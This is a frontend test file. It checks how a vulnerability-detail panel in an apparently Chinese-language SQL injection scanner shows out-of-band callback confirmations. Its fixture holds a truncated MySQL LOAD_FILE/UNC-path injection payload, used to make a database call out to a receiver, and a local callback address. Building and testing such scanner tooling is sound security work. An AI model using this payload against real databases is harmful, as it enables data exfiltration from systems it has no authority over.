import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import VulnDetail from '../components/VulnDetail';
import type { Vulnerability } from '../shared/types';

const oobVuln: Vulnerability = {
  id: 'v2',
  pointId: 'p2',
  technique: 'oob',
  dbms: 'MySQL',
  riskLevel: 'High',
  payloads: ["1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT ... ))))-- -"],
  description: 'OOB 带外确认：无回显注入成立（DBMS 主动回连接收端）',
  oob: { token: 'tk_abc123def456', callback: '127.0.0.1:8899/oob/tk_abc123def456' },
};

describe('VulnDetail OOB 带外回连区块', () => {
  it('OOB 漏洞渲染带外回连确认区块 + token + 回调地址', () => {
    render(<VulnDetail vuln={oobVuln} />);
    expect(screen.getByText(/带外回连确认（OOB）/)).toBeTruthy();
    expect(screen.getByText('tk_abc123def456')).toBeTruthy();
    expect(screen.getByText('127.0.0.1:8899/oob/tk_abc123def456')).toBeTruthy();
    expect(screen.getByText(/目标 DBMS 已主动回连至接收端/)).toBeTruthy();
  });

  it('非 OOB 漏洞不渲染带外回连区块', () => {
    const nonOob: Vulnerability = { ...oobVuln, technique: 'boolean', oob: undefined };
    render(<VulnDetail vuln={nonOob} />);
    expect(screen.queryByText(/带外回连确认/)).toBeNull();
  });

  it('无 vuln 时显示空态提示', () => {
    render(<VulnDetail vuln={null} />);
    expect(screen.getByText('请选择左侧漏洞查看详情')).toBeTruthy();
  });
});
